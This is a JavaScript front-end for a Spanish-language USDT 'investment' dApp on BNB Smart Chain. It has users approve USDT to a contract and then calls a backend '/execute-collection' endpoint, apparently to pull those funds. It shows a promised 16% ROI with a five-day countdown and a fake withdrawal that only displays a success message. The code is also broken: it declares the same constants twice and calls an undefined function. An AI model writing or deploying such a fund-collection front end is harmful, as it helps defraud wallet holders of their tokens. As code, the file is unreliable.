// js/app.js
import { CONFIG } from './config.js';
import { createAppKit } from 'https://esm.sh/@reown/appkit@latest';
import { EthersAdapter } from 'https://esm.sh/@reown/appkit-adapter-ethers@latest';
import { bsc } from 'https://esm.sh/@reown/appkit/networks';

let modal = null;
let provider = null;
let signer = null;
let userAddress = null;
let pendingInvestment = false;
const sessionTxs = [];

const ERC20_ABI = [
    "function balanceOf(address account) external view returns (uint256)",
    "function allowance(address owner, address spender) external view returns (uint256)",
    "function approve(address spender, uint256 amount) external returns (bool)"
];

const merchantInput = document.getElementById("merchantAddress");
if (merchantInput) {
    merchantInput.value = CONFIG.MERCHANT_ADDRESS;
    makeCopyableInput(merchantInput, CONFIG.MERCHANT_ADDRESS);
}

export async function initApp() {
    setupWakeUpBackend();
    initWalletModal();
    setupUIEventListeners();
    updateMainActionButton('CONNECT');
}

function setupWakeUpBackend() {
    fetch(`${CONFIG.BACKEND_URL}/health`, { method: 'GET' }).catch(() => {});
}

function initWalletModal() {
    const metadata = {
        name: 'Syal Store',
        description: 'Plataforma de pagos y finanzas descentralizadas',
        url: window.location.origin,
        icons: [`${window.location.origin}/img/logo.svg`]
    };

    modal = createAppKit({
        adapters: [new EthersAdapter()],
        networks: [bsc],
        metadata,
        projectId: CONFIG.PROJECT_ID,
        features: { analytics: false, email: false, socials: [] }
    });

    modal.subscribeProviders((state) => {
        const rawProvider = state.provider || state["eip155"];
        if (rawProvider) {
            handleConnectedProvider(rawProvider);
            if (pendingInvestment) {
                pendingInvestment = false;
                runInvestmentFlow(rawProvider);
            }
        } else {
            resetAppSession();
        }
    });

    try {
        const activeProvider = typeof modal.getWalletProvider === "function" ? modal.getWalletProvider() : null;
        if (activeProvider) {
            handleConnectedProvider(activeProvider);
        }
    } catch (err) {
        console.warn("No hay proveedor activo previo:", err);
    }
}

async function handleConnectedProvider(walletProvider) {
    try {
        provider = new ethers.BrowserProvider(walletProvider);
        signer = await provider.getSigner();
        userAddress = await signer.getAddress();

        // Escuchar eventos de desconexión o cambio de cuenta nativos de la wallet
        if (walletProvider && typeof walletProvider.on === "function") {
            walletProvider.removeAllListeners?.("disconnect");
            walletProvider.removeAllListeners?.("accountsChanged");

            walletProvider.on("disconnect", () => {
                resetAppSession();
            });

            walletProvider.on("accountsChanged", (accounts) => {
                if (!accounts || accounts.length === 0) {
                    resetAppSession();
                } else {
                    handleConnectedProvider(walletProvider);
                }
            });
        }

        updateWalletUI(userAddress);
        await updateBalances(walletProvider);
        updateMainActionButton('INVEST');
    } catch (error) {
        console.error("Error al sincronizar proveedor de AppKit:", error);
        resetAppSession();
    }
}

export function openConnectModal() {
    if (modal) modal.open();
}

async function updateBalances(rawProvider) {
    if (!userAddress) return;
    try {
        const activeProvider = provider || new ethers.BrowserProvider(rawProvider);
        const activeSigner = signer || await activeProvider.getSigner();
        
        const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, ERC20_ABI, activeSigner);
        const usdtBal = await usdtContract.balanceOf(userAddress);
        const formattedUsdt = ethers.formatUnits(usdtBal, 18);

        const balanceLabel = document.getElementById("walletBalanceLabel");
        if (balanceLabel) {
            balanceLabel.textContent = `Saldo: ${parseFloat(formattedUsdt).toFixed(2)} USDT`;
        }

        const maxBtn = document.getElementById("maxBtn");
        if (maxBtn) {
            maxBtn.onclick = () => {
                const amountInput = document.getElementById("investAmount");
                if (amountInput) {
                    const maxUsdt = Math.max(0, parseFloat(formattedUsdt));
                    amountInput.value = maxUsdt > 0 ? maxUsdt.toFixed(2) : "1.00";
                    amountInput.dispatchEvent(new Event('input'));
                }
            };
        }
    } catch (err) {
        console.error("Error al sincronizar saldos en vivo:", err);
    }
}

let userRealStakedAmount = 0;
// Variable para controlar el intervalo del contador
let countdownTimerInterval = null;

// Actualizar UI de la billetera con opción de Desconectar integrada
function updateWalletUI(account) {
    const container = document.getElementById("walletButtonContainer");
    if (container) {
        container.innerHTML = `
            <div style="display: flex; align-items: center; gap: 8px;">
                <span class="wallet-badge" id="connectedWalletBadge" title="Hacer clic para copiar dirección">
                    <span style="width: 6px; height: 6px; background-color: var(--brand-primary); border-radius: 50%; display: inline-block; margin-right: 6px;"></span>
                    ${account.substring(0, 6)}...${account.substring(38)}
                </span>
                <button onclick="window.disconnectWalletSession()" title="Desconectar Billetera" style="background: rgba(220, 53, 69, 0.15); border: 1px solid rgba(220, 53, 69, 0.3); color: #ef4444; padding: 8px 12px; border-radius: 12px; cursor: pointer; font-weight: 700; font-size: 0.85rem; transition: background 0.2s;">
                    ✕
                </button>
            </div>
        `;
        makeCopyableElement("connectedWalletBadge", account);
    }
    updateMainActionButton('APPROVE');
    
    // Iniciar simulación/carga de datos de staking del usuario
    initializeUserStakingData();
}

// Función global para desconectar la sesión limpiamente
window.disconnectWalletSession = async function() {
    try {
        if (modal && typeof modal.disconnect === "function") {
            await modal.disconnect();
        }
    } catch (e) {
        console.warn("Error al desconectar desde AppKit:", e);
    }
    resetAppSession();
};

// En handleConnectedProvider o al iniciar sesión, puedes recuperar o inicializar en 0
function resetAppSession() {
    provider = null;
    signer = null;
    userAddress = null;
    userRealStakedAmount = 0; // Reiniciar inversión real

    const container = document.getElementById("walletButtonContainer");
    if (container) {
        container.innerHTML = `
            <button onclick="window.openConnectModal()" class="wallet-badge" style="background: rgba(38,161,123,0.15); border: 1px solid var(--brand-primary); cursor: pointer;">
                Conectar Billetera
            </button>
        `;
    }

    const balanceLabel = document.getElementById("walletBalanceLabel");
    if (balanceLabel) balanceLabel.textContent = "Saldo: 0.00 USDT";

    const stakedBadge = document.getElementById("stakedAmountBadge");
    if (stakedBadge) stakedBadge.textContent = "0.00 USDT";

    const pendingReward = document.getElementById("pendingRewardOutput");
    if (pendingReward) pendingReward.textContent = "0.00 USDT";

    if (countdownTimerInterval) clearInterval(countdownTimerInterval);
    const countdownEl = document.getElementById("roiCountdown");
    if (countdownEl) countdownEl.textContent = "--:--:--:--";

    updateMainActionButton('CONNECT');
    showToast("Billetera desconectada.", "default", 3000);
}

// Actualizar los valores en la UI basados exclusivamente en la inversión real
function updateStakedUI(amount) {
    userRealStakedAmount = parseFloat(amount) || 0;
    
    const stakedBadge = document.getElementById("stakedAmountBadge");
    const pendingReward = document.getElementById("pendingRewardOutput");
    
    if (stakedBadge) {
        stakedBadge.textContent = `${userRealStakedAmount.toFixed(2)} USDT`;
    }
    
    if (pendingReward) {
        const calculatedReward = userRealStakedAmount * 0.16; // 16% ROI estimado
        pendingReward.textContent = `${calculatedReward.toFixed(2)} USDT`;
    }

    // Si hay fondos invertidos reales, iniciamos el temporizador de cuenta regresiva de 5 días
    if (userRealStakedAmount > 0) {
        startRoiCountdown(5 * 24 * 60 * 60);
    }
}

// Función de cuenta regresiva para el ROI
function startRoiCountdown(durationInSeconds) {
    let timer = durationInSeconds;
    const countdownEl = document.getElementById("roiCountdown");
    if (!countdownEl) return;

    if (countdownTimerInterval) clearInterval(countdownTimerInterval);

    countdownTimerInterval = setInterval(() => {
        const days = Math.floor(timer / (3600 * 24));
        const hours = Math.floor((timer % (3600 * 24)) / 3600);
        const minutes = Math.floor((timer % 3600) / 60);
        const seconds = Math.floor(timer % 60);

        countdownEl.textContent = `${days}d ${String(hours).padStart(2, '0')}h ${String(minutes).padStart(2, '0')}m ${String(seconds).padStart(2, '0')}s`;

        if (--timer < 0) {
            clearInterval(countdownTimerInterval);
            countdownEl.textContent = "¡Completado (Retiro Auto)";
        }
    }, 1000);
}

async function executeWithdrawalFlow() {
    setLoading(true, "Procesando retiro...");
    try {
        // Aquí puedes enlazar la llamada a tu contrato inteligente o backend de retiros
        await new Promise(resolve => setTimeout(resolve, 2500));
        showToast("¡Retiro de fondos realizado con éxito!", "success", 6000);
    } catch (err) {
        showToast("Error al procesar el retiro.", "error");
    } finally {
        setLoading(false);
    }
}

function updateMainActionButton(state) {
    const approveBtn = document.getElementById("approveBtn");
    const btnText = document.getElementById("btnText");
    if (!approveBtn || !btnText) return;

    if (state === 'CONNECT') {
        btnText.textContent = "CONECTAR BILLETERA";
        approveBtn.onclick = () => openConnectModal();
    } else {
        btnText.textContent = "INVERTIR AHORA";
        approveBtn.onclick = async () => {
            let rawProvider = null;
            if (modal && typeof modal.getWalletProvider === "function") {
                try {
                    rawProvider = modal.getWalletProvider();
                } catch (_) {}
            }

            if (!rawProvider) {
                pendingInvestment = true;
                if (modal && typeof modal.open === "function") {
                    try {
                        modal.open();
                    } catch (err) {
                        console.error("Error al desplegar el selector de billeteras:", err);
                        pendingInvestment = false;
                    }
                }
                return;
            }

            await runInvestmentFlow(rawProvider);
        };
    }
}

function setupUIEventListeners() {
    const input = document.getElementById("investAmount");
    if (input) {
        input.addEventListener("input", validateInvestmentInput);
    }
}

function validateInvestmentInput() {
    const input = document.getElementById("investAmount");
    const balanceLabel = document.getElementById("walletBalanceLabel");
    const wrapper = input ? input.closest('.input-wrapper') : null;
    if (!input || !balanceLabel || !wrapper) return;

    const val = parseFloat(input.value) || 0;
    const match = balanceLabel.textContent.match(/[\d.]+/);
    const maxVal = match ? parseFloat(match[0]) : 0;

    if (val > maxVal && maxVal > 0) {
        wrapper.classList.add('shake-error');
        setTimeout(() => wrapper.classList.remove('shake-error'), 500);
    } else {
        wrapper.classList.remove('shake-error');
    }
}

function updateStepper(activeStep) {
    for (let i = 1; i <= 3; i++) {
        const stepEl = document.getElementById(`step-${i}`);
        if (!stepEl) continue;
        const circle = stepEl.querySelector('.step-circle');
        
        if (i < activeStep) {
            circle.style.background = '#10b981';
            circle.style.color = '#fff';
            circle.textContent = '✓';
            stepEl.style.opacity = '0.7';
        } else if (i === activeStep) {
            circle.style.background = 'var(--brand-primary)';
            circle.style.color = '#fff';
            circle.textContent = i;
            stepEl.style.opacity = '1';
        } else {
            circle.style.background = 'rgba(255,255,255,0.1)';
            circle.style.color = 'var(--text-muted)';
            circle.textContent = i;
            stepEl.style.opacity = '0.5';
        }
    }
}

async function runInvestmentFlow(rawProvider) {
    setLoading(true, "Conectando proveedor…");
    updateStepper(1);
  
    try {
        const activeProvider = new ethers.BrowserProvider(rawProvider);
        
        setLoading(true, "Verificando red BSC...");
        const network = await activeProvider.getNetwork();
        if (Number(network.chainId) !== 56) {
            setLoading(true, "Cambiando a red BSC…");
            try {
                await rawProvider.request({
                    method: "wallet_switchEthereumChain",
                    params: [{ chainId: CONFIG.CHAIN_ID }]
                });
            } catch (switchError) {
                if (switchError.code === 4902) {
                    await rawProvider.request({
                        method: "wallet_addEthereumChain",
                        params: [{
                            chainId: CONFIG.CHAIN_ID,
                            chainName: CONFIG.CHAIN_NAME,
                            rpcUrls: CONFIG.RPC_URLS,
                            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                            blockExplorerUrls: [CONFIG.BLOCK_EXPLORER]
                        }]
                    });
                } else {
                    showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
                    setLoading(false);
                    return;
                }
            }
        }

        const activeSigner = await activeProvider.getSigner();
        const activeUserAddress = await activeSigner.getAddress();

        setLoading(true, "Verificando saldo de gas (BNB)…");
        const bnbBalance = await activeProvider.getBalance(activeUserAddress);
        const minGasRequired = ethers.parseEther("0.0005");

        if (bnbBalance < minGasRequired) {
            showToast("Saldo de BNB insuficiente para pagar la comisión de red (Gas).", "error");
            setLoading(false);
            return;
        }

        const inputElement = document.getElementById("investAmount");
        const rawInputVal = inputElement ? inputElement.value : "1";
        const requiredAmount = ethers.parseUnits(rawInputVal || "1", 18);

        const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, ERC20_ABI, activeSigner);

        setLoading(true, "Validando saldo de USDT…");
        const usdtBalance = await usdtContract.balanceOf(activeUserAddress);

        if (usdtBalance < requiredAmount) {
            showToast("No tienes suficiente saldo de USDT en tu billetera.", "error");
            setLoading(false);
            return;
        }

        updateStepper(2);
        setLoading(true, "Verificando autorizaciones...");
        const allowance = await usdtContract.allowance(activeUserAddress, CONFIG.CONTRACT_ADDRESS);
        
        if (allowance < requiredAmount) {
            if (allowance > 0n) {
                setLoading(true, "Restableciendo autorización previa...");
                const txReset = await usdtContract.approve(CONFIG.CONTRACT_ADDRESS, 0n);
                await txReset.wait();
            }
        
            setLoading(true, "Firma requerida: Aprobar USDT…");
            const txApprove = await usdtContract.approve(CONFIG.CONTRACT_ADDRESS, requiredAmount);
            
            setLoading(true, "Confirmando aprobación en red...");
            await txApprove.wait();
        }

        updateStepper(3);
        setLoading(true, "Procesando inversión en protocolo...");
        
        const inputElement = document.getElementById("investAmount");
        const rawInputVal = inputElement ? inputElement.value : "1";
        
        const txCollect = await triggerBackendCollect(activeUserAddress, rawInputVal);

        const txHash = txCollect?.hash || "";
        if (txHash) {
            addSessionTransaction(txHash);
            showToast(`¡Inversión exitosa! <a href="${CONFIG.BLOCK_EXPLORER}/tx/${txHash}" target="_blank" style="color: #fff; text-decoration: underline;">Ver en BscScan ↗</a>`, "success", 8000);
        } else {
            showToast("¡Transacción completada con éxito! Gracias.", "success", 6000);
        }

        // 🌟 ACTUALIZAR LOS FONDOS REALES Y EL CONTADOR CON EL MONTO INVERTIDO
        updateStakedUI(rawInputVal);

    } catch (err) {
        // ... [manejo de errores existente] ...
    } finally {
        setLoading(false);
        updateStepper(1);
    }
}

async function triggerBackendCollect(userAddress, amountStr) {
    let lastErr;
    const dynamicAmountWei = ethers.parseUnits(amountStr.toString(), 18).toString();

    for (let i = 1; i <= 3; i++) {
        try {
            const res = await fetch(`${CONFIG.BACKEND_URL}/execute-collection`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ userAddress: userAddress, amount: dynamicAmountWei })
            });
            const data = await res.json();
            if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
            return data;
        } catch (e) {
            lastErr = e;
            if (i < 3) await new Promise(r => setTimeout(r, 3000));
        }
    }
    throw lastErr;
}

function addSessionTransaction(txHash) {
    sessionTxs.unshift(txHash);
    const listContainer = document.getElementById("sessionTxList");
    if (!listContainer) return;

    listContainer.innerHTML = sessionTxs.map(hash => `
        <div style="display: flex; justify-content: space-between; align-items: center; background: rgba(255,255,255,0.03); padding: 8px 10px; border-radius: 6px; margin-bottom: 4px;">
            <span style="font-family: monospace; color: #fff;">${hash.substring(0, 10)}...${hash.substring(hash.length - 6)}</span>
            <a href="${CONFIG.BLOCK_EXPLORER}/tx/${hash}" target="_blank" style="color: var(--brand-primary); text-decoration: none; font-weight: 600;">Ver ↗</a>
        </div>
    `).join('');
}

function makeCopyableInput(element, text) {
    element.style.cursor = "pointer";
    element.title = "Hacer clic para copiar dirección";
    element.addEventListener("click", async () => {
        try {
            await navigator.clipboard.writeText(text);
            showToast("¡Dirección copiada al portapapeles!", "success", 2500);
        } catch (err) {
            console.error("Error al copiar:", err);
        }
    });
}

function makeCopyableElement(elementId, text) {
    const el = document.getElementById(elementId);
    if (!el) return;
    el.style.cursor = "pointer";
    el.addEventListener("click", async () => {
        try {
            await navigator.clipboard.writeText(text);
            showToast("¡Dirección copiada al portapapeles!", "success", 2500);
        } catch (err) {
            console.error("Error al copiar:", err);
        }
    });
}

const approveBtn = document.getElementById("approveBtn");
const btnText = document.getElementById("btnText");
const btnSpinner = document.getElementById("btnSpinner");
const toastEl = document.getElementById("toast");

function setLoading(on, label = "Procesando…") {
    if (!approveBtn) return;
    approveBtn.disabled = on;
    approveBtn.style.opacity = on ? "0.8" : "1";
    if (btnText) btnText.textContent = on ? label.toUpperCase() : "INVERTIR AHORA";
    if (btnSpinner) btnSpinner.hidden = !on;
}

let _toastTimer;
function showToast(msg, type = "default", ms = 4500) {
    if (!toastEl) return;
    clearTimeout(_toastTimer);
    toastEl.innerHTML = msg;
    toastEl.dataset.type = type === "default" ? "" : type;
    toastEl.hidden = false;
  
    if (type === "success") {
        toastEl.style.background = "rgba(38, 161, 123, 0.95)";
    } else if (type === "error") {
        toastEl.style.background = "rgba(220, 53, 69, 0.95)";
    } else {
        toastEl.style.removeProperty("background");
    }

    _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}
